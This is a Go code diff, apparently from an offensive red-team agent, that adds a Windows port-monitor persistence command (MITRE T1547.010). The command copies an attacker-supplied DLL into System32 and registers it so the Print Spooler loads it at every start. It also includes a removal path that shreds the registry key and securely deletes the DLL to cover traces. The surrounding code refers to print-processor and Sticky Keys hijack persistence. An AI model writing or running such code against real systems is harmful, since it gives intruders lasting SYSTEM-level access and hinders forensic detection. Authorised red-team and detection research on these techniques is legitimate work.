@@ -253,6 +253,110 @@ func persistPrintProcessor(args persistArgs) structs.CommandResult {
 	}
 }
 
+// --- Port Monitor Persistence (T1547.010) ---
+
+// portMonitorRegBase is the registry path for port monitors.
+const portMonitorRegBase = `SYSTEM\CurrentControlSet\Control\Print\Monitors`
+
+// persistPortMonitor installs/removes Port Monitor DLL persistence (T1547.010).
+// Registers a DLL as a port monitor, loaded by spoolsv.exe at service start.
+// Similar to Print Processors but uses a different registry location and DLL
+// goes into System32 directly.
+func persistPortMonitor(args persistArgs) structs.CommandResult {
+	if args.Name == "" {
+		args.Name = "FawkesMon"
+	}
+
+	regPath := portMonitorRegBase + `\` + args.Name
+
+	switch strings.ToLower(args.Action) {
+	case "install":
+		if args.Path == "" {
+			return errorResult("Error: path is required (DLL to install as port monitor)")
+		}
+
+		// Verify source DLL exists
+		if _, err := os.Stat(args.Path); err != nil {
+			return errorf("Error: source DLL not found: %v", err)
+		}
+
+		// Port monitor DLLs are loaded from System32
+		sys32 := os.Getenv("SystemRoot")
+		if sys32 == "" {
+			sys32 = `C:\Windows`
+		}
+		destDir := filepath.Join(sys32, "System32")
+		dllName := filepath.Base(args.Path)
+		destPath := filepath.Join(destDir, dllName)
+
+		// Copy DLL to System32
+		src, err := os.Open(args.Path)
+		if err != nil {
+			return errorf("Error opening source DLL '%s': %v", args.Path, err)
+		}
+		defer src.Close()
+
+		dst, err := os.Create(destPath)
+		if err != nil {
+			return errorf("Error creating '%s': %v (admin required)", destPath, err)
+		}
+		defer dst.Close()
+
+		bytes, err := io.Copy(dst, src)
+		if err != nil {
+			dst.Close()
+			return errorf("Error copying DLL: %v", err)
+		}
+		if err := dst.Close(); err != nil {
+			return errorf("Error finalizing DLL copy: %v", err)
+		}
+
+		// Register in registry — Driver value is just the filename
+		key, _, err := registry.CreateKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
+		if err != nil {
+			os.Remove(destPath)
+			return errorf("Error creating HKLM\\%s: %v (admin required)", regPath, err)
+		}
+		defer key.Close()
+
+		if err := key.SetStringValue("Driver", dllName); err != nil {
+			os.Remove(destPath)
+			return errorf("Error setting Driver value: %v", err)
+		}
+
+		return successf("Installed port monitor persistence:\n  Name:     %s\n  DLL:      %s → %s (%d bytes)\n  Registry: HKLM\\%s\n  Driver:   %s\n  Trigger:  Loaded by spoolsv.exe when Print Spooler starts\n  Note:     Requires admin. Restart spooler to load immediately:\n            net stop spooler && net start spooler", args.Name, args.Path, destPath, bytes, regPath, dllName)
+
+	case "remove":
+		// Try to read the Driver value before shredding, so we can clean up the DLL
+		var dllName string
+		if rk, err := registry.OpenKey(registry.LOCAL_MACHINE, regPath, registry.QUERY_VALUE); err == nil {
+			dllName, _, _ = rk.GetStringValue("Driver")
+			rk.Close()
+		}
+
+		// Shred registry key
+		shredRegistryKey(registry.LOCAL_MACHINE, regPath)
+
+		// Remove DLL from System32
+		sys32 := os.Getenv("SystemRoot")
+		if sys32 == "" {
+			sys32 = `C:\Windows`
+		}
+		if dllName == "" && args.Path != "" {
+			dllName = filepath.Base(args.Path)
+		}
+		if dllName != "" {
+			dllPath := filepath.Join(sys32, "System32", dllName)
+			secureRemove(dllPath)
+		}
+
+		return successf("Removed port monitor persistence:\n  Name:     %s\n  Registry: HKLM\\%s (shredded)\n  DLL:      %s (secure removed from System32)", args.Name, regPath, dllName)
+
+	default:
+		return errorf("Error: unknown action '%s'. Use: install or remove", args.Action)
+	}
+}
+
 // accessibilityTargets maps accessibility binaries to their trigger descriptions.
 var accessibilityTargets = [][2]string{
 	{"sethc.exe", "Sticky Keys — press Shift 5x at lock screen"},
